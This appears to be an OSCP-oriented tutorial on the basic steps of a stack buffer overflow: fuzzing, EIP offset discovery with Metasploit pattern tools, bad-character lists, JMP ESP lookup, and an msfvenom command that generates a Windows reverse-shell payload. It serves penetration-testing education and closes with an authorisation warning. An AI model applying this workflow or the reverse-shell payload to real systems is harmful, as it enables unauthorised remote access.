# Buffer Overflow Basics

Buffer overflows are a classic exploitation technique that you'll encounter frequently in OSCP labs and exams.

## What is a Buffer Overflow?

A buffer overflow occurs when a program writes more data to a buffer than it can hold, causing the excess data to overflow into adjacent memory locations. This can lead to:

- Program crashes
- Memory corruption
- Arbitrary code execution

## Basic Steps

### 1. Fuzzing
Find the offset that causes the crash:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
```

### 2. Controlling EIP
Find the exact position where EIP is overwritten:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386f4237
```

### 3. Finding Bad Characters
Identify characters that break the exploit:

```python
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  # ... more bad chars
)
```

### 4. Finding a JMP ESP
Find a reliable address to jump to:

```bash
msf-nasm_shell
nasm> jmp esp
# Use the output in !mona modules
```

### 5. Generating Payload
Create your shellcode:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -f c -b "\x00"
```

## Quick Tips

- Always use `!mona` commands in Immunity Debugger
- Save your exploit templates for reuse
- Test each component individually
- Document your offsets and bad characters

> **Warning:** Only practice buffer overflows on systems you own or have explicit permission to test.
